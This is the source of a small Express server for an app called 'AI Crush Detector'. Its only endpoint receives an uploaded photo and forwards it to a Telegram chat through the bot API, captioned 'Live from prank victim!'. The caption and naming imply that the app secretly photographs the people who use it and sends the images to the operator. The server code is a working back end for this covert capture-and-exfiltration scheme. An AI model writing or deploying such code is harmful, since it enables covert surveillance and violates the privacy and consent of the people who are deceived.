// Simple Express server for Telegram photo uploads
const express = require('express');
const multer = require('multer');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Configure multer for file uploads
const upload = multer({
    storage: multer.memoryStorage(),
    limits: {
        fileSize: 10 * 1024 * 1024 // 10MB limit
    }
});

// Serve static files
app.use(express.static(path.join(__dirname)));

// Endpoint to send photos to Telegram
app.post('/api/send-photo', upload.single('photo'), async (req, res) => {
    try {
        if (!req.file) {
            return res.status(400).json({ error: "No photo provided" });
        }

        const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
        const telegramChatId = process.env.TELEGRAM_CHAT_ID;

        if (!telegramBotToken || !telegramChatId) {
            console.log('❌ Telegram credentials not configured');
            return res.status(500).json({ error: "Telegram credentials not configured" });
        }

        // Send photo to Telegram
        const formData = new FormData();
        formData.append('chat_id', telegramChatId);
        formData.append('photo', new Blob([req.file.buffer]), 'capture.jpg');
        formData.append('caption', '📸 Crush Detector Capture - Live from prank victim!');

        const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
            method: 'POST',
            body: formData
        });

        if (response.ok) {
            console.log('✅ Photo sent to Telegram successfully');
            res.json({ success: true, message: "Photo sent to Telegram" });
        } else {
            const error = await response.text();
            console.error('❌ Telegram API error:', error);
            res.status(500).json({ error: "Failed to send to Telegram" });
        }
    } catch (error) {
        console.error('❌ Error sending photo:', error);
        res.status(500).json({ error: "Internal server error" });
    }
});

// Default route
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
    console.log(`🚀 AI Crush Detector server running on port ${PORT}`);
    console.log(`📱 Telegram Bot: ${process.env.TELEGRAM_BOT_TOKEN ? 'Connected' : 'Not configured'}`);
    console.log(`💬 Chat ID: ${process.env.TELEGRAM_CHAT_ID ? 'Set' : 'Not configured'}`);
});
